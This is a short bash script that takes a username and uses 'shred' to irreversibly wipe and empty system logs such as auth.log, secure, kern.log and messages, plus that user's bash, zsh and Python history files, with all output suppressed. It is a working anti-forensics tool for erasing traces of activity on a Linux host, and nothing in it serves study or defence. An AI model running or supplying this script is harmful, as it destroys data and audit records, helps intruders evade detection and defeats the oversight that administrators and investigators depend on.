#!/bin/bash

set -euo pipefail # Add -x option to enable execution tracking (good for debugging).

main () {
    local username="$1"
    declare_variables "$username"
    start_log_killer
}

declare_variables() {
    local username="$1"
    list_of_log_files=(
        "/var/log/auth.log"
        "/var/log/kern.log"
        "/var/log/cron.log"
        "/var/log/maillog"
        "/var/log/boot.log"
        "/var/log/secure"
        "/var/log/yum.log"
        "/var/log/messages"
        "/var/log/mysql/error.log"
        "/home/$username/.bash_history"
        "/home/$username/.zsh_history"
        "/home/$username/.python_history"
    )
}

start_log_killer() {
    # Iterating over each log file in the list of log files
    for file in "${list_of_log_files[@]}"; do
        if [ -f "$file" ]; then
            # Shredding the file
            shred -vfzu "$file" && :> "$file"
        fi
    done &>/dev/null
}

main "$1"